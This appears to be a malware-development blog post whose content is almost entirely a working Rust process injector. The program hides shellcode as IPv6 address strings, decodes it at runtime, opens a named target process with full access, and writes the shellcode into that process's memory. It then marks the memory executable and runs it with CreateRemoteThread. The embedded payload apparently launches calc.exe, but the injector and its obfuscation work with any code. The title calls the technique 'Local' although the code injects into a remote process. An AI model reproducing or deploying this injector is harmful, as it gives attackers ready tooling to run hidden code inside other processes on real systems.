---
title: "Process-Injection (Local)"
date: 2026-07-19 00:00:00 +0100
categories: [Malware, Development]
tags:
  - malware
  - development
---

# Process-Injection (Local)


## main.rs

```rust
use winapi::um::winbase::lstrcmpW;
use winapi::um::winnt::{HANDLE, PVOID, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualProtectEx};
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::shared::minwindef::{DWORD, FALSE};
use winapi::um::winuser::CharLowerW;
use std::ffi::CString;
use std::ptr;
use std::mem;
use std::io::{self, Write};
use widestring::WideCString;
use winapi::ctypes::wchar_t;
use winapi::um::errhandlingapi::GetLastError;

// Declare array with ipv6 shellcode obfuscation
const IPV6_ARRAY: [&str; 17] = [
    "FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
    "AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
    "8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
    "8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
    "595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBE0:1D2A:0A41:BAA6:95BD:9DFF",
    "D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D563:616C:6300"
];
const NUMBER_OF_ELEMENTS: usize = 17;

// Decode obfuscation at runtime
fn ipv6_deobfuscation(ipv6_array: &[&'static str], size: usize) -> Vec<u8> {
    unsafe {
        let ntdll = CString::new("NTDLL").unwrap();
        let hmodule = GetModuleHandleA(ntdll.as_ptr());
        let rtl_string = CString::new("RtlIpv6StringToAddressA").unwrap();
        let func: extern "system" fn(*const i8, *mut *const i8, *mut u8) -> i32 =
            mem::transmute(GetProcAddress(hmodule, rtl_string.as_ptr()));

        let mut buffer = vec![0u8; size * 16];
        let mut ptr = buffer.as_mut_ptr();

        for ip in ipv6_array.iter().take(size) {
            let c_ip = CString::new(*ip).unwrap();
            let mut terminator: *const i8 = ptr::null();
            if func(c_ip.as_ptr(), &mut terminator, ptr) != 0 {
                panic!("RtlIpv6StringToAddressA failed");
            }
            ptr = ptr.add(16);
        }

        buffer
    }
}

// The function parameters:
    // - proc_name, is a string type that will return the process name
    // - Result, will return DWORD, HANDLE > when OK
fn get_remote_process_handle(proc_name: &str) -> Result<(DWORD, HANDLE), String> {

    unsafe {
        // Initialize the PROCESSENTRY32W structure used to store process information
        let mut process_entry: PROCESSENTRY32W = mem::zeroed();

        // Set the size of the structure (required before calling Process32FirstW)
        process_entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as DWORD;

        // Set the size of the structure (required before calling Process32FirstW)
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return Err(format!(
                "[CreateToolhelp32Snapshot] Failed! Error: {}", GetLastError()
            ));
        }

        // Retrieve the first process from the snapshot
        if Process32FirstW(snapshot, &mut process_entry) == FALSE {
            CloseHandle(snapshot);
            return Err(format!("Process32FirstW failed: {}", GetLastError()));
        }

        // Convert the target process name to lowercase for case-insensitive comparison
        let lwr_process_name = WideCString::from_str(proc_name.to_lowercase()).unwrap();
        let lwr_process_name_ptr = lwr_process_name.as_ptr();

        loop {
            // Create a buffer to store the lowercase version of the current process name
            let mut lower_process_name: [wchar_t; 520] = [0; 520];

            // Windows strings are null-terminated, so stop when a zero value is found
            let mut dw_size = 0;

            // Count characters until reaching the null terminator or the buffer limit
            while process_entry.szExeFile[dw_size] != 0 && dw_size < 520 {
                dw_size += 1;
            }

            // Convert the current process name to lowercase for comparison
            if dw_size < 520 {
                for i in 0..dw_size {
                    lower_process_name[i] = CharLowerW(process_entry.szExeFile[i] as *mut _) as wchar_t;
                }
                // Add the null terminator required by Windows strings
                lower_process_name[dw_size] = 0;
            }

            // Compare the lowercase process name with the target process name
            if lstrcmpW(lower_process_name.as_ptr(), lwr_process_name_ptr) == 0 {
                // Retrieve Process ID of current loaded process
                let pid = process_entry.th32ProcessID;
                // Access Process
                let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        
                CloseHandle(snapshot);

                // Checks if handle is valid
                if h_process.is_null() {
                    return Err(format!("[OpenProcess] failed: {}", GetLastError()));
                }

                // Return pid
                return Ok((pid, h_process));

            }
            // Move to the next process in the snapshot
            if Process32NextW(snapshot, &mut process_entry) == FALSE {
                break;
            }

        }
        CloseHandle(snapshot);
        Err("No processes Found".to_string())
    }
}
fn remote_process_injection(h_process: HANDLE, shellcode: &[u8]) -> Result<(), String> {
    unsafe {
        // Allocate memory inside the target process address space for the shellcode
        let shellcode_mem_addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if shellcode_mem_addr.is_null() {
            return Err(format!("[VirtualAllocEx] failed: {}", GetLastError()));
        }

        println!("[+] Allocated Memory at: 0x{:?}", shellcode_mem_addr);
        print!("[+] Press <Enter> To Write Shellcode");

        // Wait for user confirmation before writing shellcode
        io::stdout().flush().unwrap();
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();

        let mut bytes_written = 0;
        // Copy shellcode bytes from the current process into the allocated memory of the target process
        if WriteProcessMemory(h_process, shellcode_mem_addr, shellcode.as_ptr() as PVOID, shellcode.len(), &mut bytes_written) == FALSE || bytes_written != shellcode.len() {
            return Err(format!("[WriteProcessMemory] failed: {}", GetLastError()));
        }

        println!("[+] Written {} bytes to Shellcode", bytes_written);

        let mut old_protect: DWORD = 0;
        if VirtualProtectEx(h_process, shellcode_mem_addr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) == FALSE {
            return Err(format!("[VirtualProtectEx] failed: {}", GetLastError()));
        }
        println!("[+] Executing Shellcode!");

        // Create a thread inside the target process starting at the shellcode address
        // transmute() changes the pointer type from a memory pointer to a function pointer.
        let thread = CreateRemoteThread(h_process, ptr::null_mut(), 0, Some(mem::transmute(shellcode_mem_addr)), ptr::null_mut(), 0, ptr::null_mut());

        if thread.is_null() {
            return Err(format!("[CreateRemoteThread] failed: {}", GetLastError()));
        }

        println!("[+] Completed Injection!");
        Ok(())

    }
}

fn main() {
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 2 {
        println!("[+] Usage: {} <process-name>", args[0]);
        return;
    }

    let shellcode = ipv6_deobfuscation(&IPV6_ARRAY, NUMBER_OF_ELEMENTS);
    println!("[+] Decrypted Shellcode At: 0x{:?}", shellcode.as_ptr());

    println!("[i] Searching For Target Process Id Of \"{}\" ... ", args[1]);
    let (_pid, h_process) = match get_remote_process_handle(&args[1]) {
        Ok((pid, handle)) => {
            println!("[+] Found Target Process Id Of {}", pid);
            (pid, handle)
        },
        Err(e) => {
            println!("[!] Process Not Found! Error: {}", e);
            return;
        }
    };

    if let Err(e) = remote_process_injection(h_process, &shellcode) { println!("[!] Error: {}", e)}

    unsafe {
        CloseHandle(h_process);
    }

    print!("[!] Press Enter To Quit ... ");
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
}
```

